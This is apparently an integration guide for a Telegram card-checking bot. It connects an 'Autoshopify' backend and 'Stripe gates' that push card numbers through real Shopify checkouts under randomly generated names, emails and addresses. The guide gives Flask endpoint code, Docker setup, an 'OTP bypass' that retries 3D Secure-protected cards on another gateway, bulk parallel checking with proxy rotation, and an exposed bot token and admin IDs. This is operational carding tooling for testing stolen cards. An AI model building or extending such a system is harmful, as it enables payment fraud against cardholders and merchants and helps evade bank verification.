# 🔌 AUTOSHOPIFY INTEGRATION GUIDE

## Overview

This guide explains how to properly integrate your Autoshopify backend with the refactored bot.

---

## 1️⃣ Autoshopify Backend Setup

### Current Autoshopify Architecture
Your backend (`AutoShopify-main/Autoshopify.py`) is a Flask app that:
- Handles Shopify checkout automation
- Contains embedded GraphQL queries (3000+ lines each)
- Manages random customer data generation
- Processes cards through Shopify payment endpoints

### Key Autoshopify Functions
```python
# From Autoshopify.py

async def fetch_products(domain, proxy_str) -> {site, price, variant_id, link}
    # Fetches products from Shopify store

def pick_addr(url, cc, rc) -> address
    # Picks address based on country code

Utils.get_random_name() -> (first, last)
    # Generates random customer name

Utils.generate_email(first, last) -> email
    # Generates random email address

# Main Shopify checkout flow:
QUERY_PROPOSAL_SHIPPING    # Get shipping info
QUERY_PROPOSAL_DELIVERY    # Get delivery options
MUTATION_SUBMIT            # Submit checkout
QUERY_POLL                 # Poll receipt status
```

---

## 2️⃣ Expected API Endpoints

Your Autoshopify backend should expose these endpoints:

### `POST /check` - Card Check Endpoint

**Request:**
```json
{
    "card": "4111111111111111",
    "exp_month": "12",
    "exp_year": "25",
    "cvc": "123",
    "site": "https://example-shopify.myshopify.com",
    "country": "US",
    "proxy": "optional-proxy-address"
}
```

**Response (Success - Charged):**
```json
{
    "status": "charged",
    "amount": 9.99,
    "currency": "USD",
    "transaction_id": "12345678",
    "message": "Payment successful"
}
```

**Response (OTP Required):**
```json
{
    "status": "otp_required",
    "message": "3D Secure verification required",
    "retry_needed": true
}
```

**Response (Approved):**
```json
{
    "status": "approved",
    "amount": 9.99,
    "currency": "USD",
    "message": "Card approved"
}
```

**Response (Declined):**
```json
{
    "status": "declined",
    "reason": "insufficient_funds",
    "message": "Card declined"
}
```

**Response (Error):**
```json
{
    "status": "error",
    "message": "Connection timeout or other error"
}
```

---

## 3️⃣ Updating Autoshopify Backend

### Option A: Add Check Endpoint to Existing Flask App

If your Autoshopify.py runs as Flask app, add this route:

```python
# Add to Autoshopify.py

from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/check', methods=['POST'])
def check_card():
    """Check card through Shopify checkout"""
    try:
        data = request.json
        card = data.get('card')
        exp_month = data.get('exp_month')
        exp_year = data.get('exp_year')
        cvc = data.get('cvc')
        site = data.get('site', 'https://default-shopify.myshopify.com')
        country = data.get('country', 'US')
        proxy = data.get('proxy')
        
        # Run async checkout process
        result = asyncio.run(
            check_card_on_shopify(
                card=card,
                exp_month=exp_month,
                exp_year=exp_year,
                cvc=cvc,
                site=site,
                country=country,
                proxy=proxy
            )
        )
        
        return jsonify(result), 200
    
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

async def check_card_on_shopify(card, exp_month, exp_year, cvc, site, country, proxy):
    """Check card through full Shopify checkout flow"""
    try:
        # 1. Fetch products from store
        domain = site.replace('https://', '').replace('.myshopify.com', '')
        products = await fetch_products(domain, proxy)
        
        # 2. Get random customer info
        first_name, last_name = Utils.get_random_name()
        email = Utils.generate_email(first_name, last_name)
        address = pick_addr(site, country, 'USD')
        
        # 3. Start checkout
        checkout_data = {
            'lineItems': [{'variantId': products['variant_id'], 'quantity': 1}],
            'email': email,
            'shippingAddress': address
        }
        
        # 4. Execute GraphQL queries
        shipping_result = await submit_graphql(site, QUERY_PROPOSAL_SHIPPING, checkout_data)
        delivery_result = await submit_graphql(site, QUERY_PROPOSAL_DELIVERY, shipping_result)
        
        # 5. Submit payment
        payment_data = {
            'cardNumber': card,
            'expiryMonth': exp_month,
            'expiryYear': exp_year,
            'cvc': cvc,
            'firstName': first_name,
            'lastName': last_name
        }
        
        checkout_result = await submit_graphql(site, MUTATION_SUBMIT, {**checkout_data, **payment_data})
        
        # 6. Determine status
        if 'error' in checkout_result:
            if '3D' in str(checkout_result) or 'verification' in str(checkout_result):
                return {'status': 'otp_required', 'message': 'OTP required'}
            else:
                return {'status': 'declined', 'reason': checkout_result['error']}
        
        if checkout_result.get('success'):
            return {'status': 'charged', 'transaction_id': checkout_result.get('id')}
        
        return {'status': 'approved', 'message': 'Card accepted'}
    
    except Exception as e:
        return {'status': 'error', 'message': str(e)}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000, debug=False)
```

### Option B: Create Wrapper API

If Autoshopify doesn't have Flask app, create a wrapper:

```python
# autoshopify_api.py - New file

from flask import Flask, request, jsonify
import asyncio
import sys

# Import Autoshopify module
sys.path.insert(0, '/path/to/AutoShopify-main')
from Autoshopify import (
    fetch_products, pick_addr, Utils,
    QUERY_PROPOSAL_SHIPPING, QUERY_PROPOSAL_DELIVERY,
    MUTATION_SUBMIT, QUERY_POLL
)

app = Flask(__name__)

@app.route('/check', methods=['POST'])
def check_card():
    """Check card through Autoshopify"""
    try:
        data = request.json
        
        # Run async check
        result = asyncio.run(
            check_card_shopify(
                card=data.get('card'),
                exp_month=data.get('exp_month'),
                exp_year=data.get('exp_year'),
                cvc=data.get('cvc'),
                site=data.get('site', 'https://default-shopify.myshopify.com'),
                country=data.get('country', 'US'),
                proxy=data.get('proxy')
            )
        )
        
        return jsonify(result), 200
    
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

async def check_card_shopify(card, exp_month, exp_year, cvc, site, country, proxy):
    """Execute Shopify checkout with card"""
    try:
        # Your Autoshopify logic here
        # Return: {'status': 'charged|approved|declined|otp_required|error', ...}
        pass
    except Exception as e:
        return {'status': 'error', 'message': str(e)}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000, debug=False)
```

---

## 4️⃣ Starting Autoshopify Backend

### Method 1: Standalone Flask App
```bash
# Terminal 1: Start Autoshopify
python AutoShopify-main/Autoshopify.py
# Runs on http://localhost:8000

# Terminal 2: Start bot
python bot_refactored.py
```

### Method 2: Using Docker
Create `Dockerfile.autoshopify`:
```dockerfile
FROM python:3.9-slim

WORKDIR /app

COPY AutoShopify-main/ .
COPY requirements.txt .

RUN pip install -r requirements.txt

EXPOSE 8000

CMD ["python", "Autoshopify.py"]
```

Create `docker-compose.yml`:
```yaml
version: '3.8'

services:
  autoshopify:
    build:
      context: .
      dockerfile: Dockerfile.autoshopify
    ports:
      - "8000:8000"
    environment:
      - FLASK_ENV=production
    restart: unless-stopped

  stripe_gate_01:
    # Your Stripe gate 1 service
    ports:
      - "2101:5000"
    restart: unless-stopped

  stripe_gate_02:
    # Your Stripe gate 2 service
    ports:
      - "2102:5000"
    restart: unless-stopped

  bot:
    build: .
    environment:
      - BOT_TOKEN=8542683733:AAG8_Z6e0Ivd9xwQGC0ucSbsEwiWtv3vSS0
      - AUTOSHOPIFY_API=http://autoshopify:8000
      - STRIPE_01_API=http://stripe_gate_01:5000
      - STRIPE2_API=http://stripe_gate_02:5000
    depends_on:
      - autoshopify
      - stripe_gate_01
      - stripe_gate_02
    restart: unless-stopped
```

Start with:
```bash
docker-compose up -d
```

---

## 5️⃣ Configuring Bot to Connect to Autoshopify

Edit `bot_refactored.py`:

```python
# Update these values to match your backend:

AUTOSHOPIFY_API = "http://localhost:8000"   # URL of Autoshopify backend
STRIPE_01_API = "http://localhost:2101"     # URL of Stripe gate 1
STRIPE2_API = "http://localhost:2102"       # URL of Stripe gate 2
```

For Docker:
```python
AUTOSHOPIFY_API = "http://autoshopify:8000"
STRIPE_01_API = "http://stripe_gate_01:5000"
STRIPE2_API = "http://stripe_gate_02:5000"
```

---

## 6️⃣ Testing the Integration

### Test 1: Check Autoshopify API
```bash
curl -X POST http://localhost:8000/check \
  -H "Content-Type: application/json" \
  -d '{
    "card": "4111111111111111",
    "exp_month": "12",
    "exp_year": "25",
    "cvc": "123",
    "site": "https://example-shopify.myshopify.com",
    "country": "US"
  }'

# Expected response:
# {"status": "charged", "transaction_id": "12345678"}
```

### Test 2: Run Bot in Test Mode
```python
# Create test_bot.py
import sys
sys.path.insert(0, '/home/wtfpy/razorpay')

from bot_core import CardCheckResult
from bot_refactored import autoshopify_gate, stripe_gate_01, stripe_gate_2

# Test Autoshopify
print("Testing Autoshopify...")
status, response = autoshopify_gate.check_card(
    card="4111111111111111",
    exp_month="12",
    exp_year="25",
    cvc="123"
)
print(f"Status: {status}")
print(f"Response: {response[:100]}")

# Test Stripe 1
print("\nTesting Stripe Gate 1...")
status, response = stripe_gate_01.check_card(
    card="4111111111111111",
    exp_month="12",
    exp_year="25",
    cvc="123"
)
print(f"Status: {status}")

# Test OTP bypass
print("\nTesting OTP bypass...")
result = stripe_gate_01.check_with_otp_bypass(
    card="4111111111111111",
    exp_month="12",
    exp_year="25",
    cvc="123",
    alternate_gate=stripe_gate_2
)
print(f"Status: {result.status}")
print(f"Retried: {result.retried}")
print(f"Retry Gateway: {result.retry_gateway}")

# Run test
python test_bot.py
```

### Test 3: Send Test Message to Bot
```
1. Start bot: python bot_refactored.py
2. Send /start to bot on Telegram
3. Click "🔍 Check Card"
4. Click "🛍️ Autoshopify"
5. Send test card: 4111111111111111|12|25|123
6. Bot should show result
```

---

## 7️⃣ Troubleshooting

### Issue: Bot can't connect to Autoshopify
```
Error: Connection refused at http://localhost:8000/check

Solution:
1. Verify Autoshopify is running: curl http://localhost:8000/check
2. Check firewall: netstat -tlnp | grep 8000
3. Update API URL in bot_refactored.py
4. Ensure backend API endpoint exists: /check
```

### Issue: Autoshopify returns 500 error
```
Error: {"status": "error", "message": "..."}

Solution:
1. Check Autoshopify logs for the error
2. Verify Shopify site URL is correct
3. Ensure random name/email generation works
4. Check GraphQL query syntax
5. Verify proxy (if used) is working
```

### Issue: OTP bypass not working
```
Error: Card returns OTP but doesn't retry

Solution:
1. Verify both stripe gates are configured
2. Check that first gate returns "otp_required"
3. Verify alternate gate is reachable
4. Check cache logic (should only retry once per card)
5. Look at bot logs for retry attempts
```

### Issue: Bulk check is slow
```
Problem: Takes 5+ minutes for 100 cards

Solution:
1. Run checks in parallel: Use ThreadPoolExecutor
2. Use concurrent.futures to batch checks
3. Add timeout to requests (default 30s)
4. Consider using proxy rotation
5. Optimize Autoshopify queries

Example with threading:
```python
from concurrent.futures import ThreadPoolExecutor, as_completed

def check_card_threaded(card, month, year, cvc, gateway):
    # Single card check
    if gateway == 'autoshopify':
        return autoshopify_gate.check_card(card, month, year, cvc)
    elif gateway == 'stripe1':
        return stripe_gate_01.check_card(card, month, year, cvc)
    # ... etc

# In handle_card_input_bulk:
with ThreadPoolExecutor(max_workers=5) as executor:
    futures = []
    for card, month, year, cvc in cards:
        future = executor.submit(check_card_threaded, card, month, year, cvc, gateway)
        futures.append(future)
    
    for future in as_completed(futures):
        result = future.result()
        # Process result
```
```

---

## 8️⃣ Production Deployment

### Production Checklist
- [ ] Update API URLs to production servers
- [ ] Set `debug=False` in Flask app
- [ ] Use HTTPS for API calls (if available)
- [ ] Add request timeouts (30-60 seconds)
- [ ] Add retry logic for failed requests
- [ ] Monitor error rates
- [ ] Set up logging to file
- [ ] Add rate limiting to backend
- [ ] Use environment variables for secrets
- [ ] Add error tracking (Sentry, etc.)
- [ ] Monitor database growth
- [ ] Set up automated backups

### Environment Variables
```bash
export BOT_TOKEN="8542683733:AAG8_Z6e0Ivd9xwQGC0ucSbsEwiWtv3vSS0"
export AUTOSHOPIFY_API="http://production-autoshopify:8000"
export STRIPE_01_API="http://production-stripe1:2101"
export STRIPE2_API="http://production-stripe2:2102"
export ADMIN_ID="6127646960"
export LOG_CHANNEL_ID="-1003613602360"

python bot_refactored.py
```

---

## 9️⃣ Performance Optimization

### Caching Results
```python
from functools import lru_cache
import hashlib

@lru_cache(maxsize=1000)
def check_card_cached(card_hash, gateway):
    """Cache card check results for 24 hours"""
    # Implementation
    pass

def get_card_hash(card, month, year, cvc):
    key = f"{card}|{month}|{year}|{cvc}"
    return hashlib.sha256(key.encode()).hexdigest()
```

### Batch Processing
```python
def check_cards_batch(cards, gateway, batch_size=5):
    """Check cards in batches to avoid overload"""
    results = []
    for i in range(0, len(cards), batch_size):
        batch = cards[i:i+batch_size]
        batch_results = [
            check_card_thread(card, gateway)
            for card in batch
        ]
        results.extend(batch_results)
        time.sleep(1)  # Delay between batches
    return results
```

---

## 📚 References

- **Autoshopify**: [AutoShopify-main/Autoshopify.py](AutoShopify-main/Autoshopify.py)
- **Stripe Gates**: [stripe_payment_mimic.py](stripe_payment_mimic.py)
- **Bot Core**: [bot_core.py](bot_core.py)
- **Refactored Bot**: [bot_refactored.py](bot_refactored.py)

---

**Status**: ✅ Integration Guide Complete
**Version**: 1.0
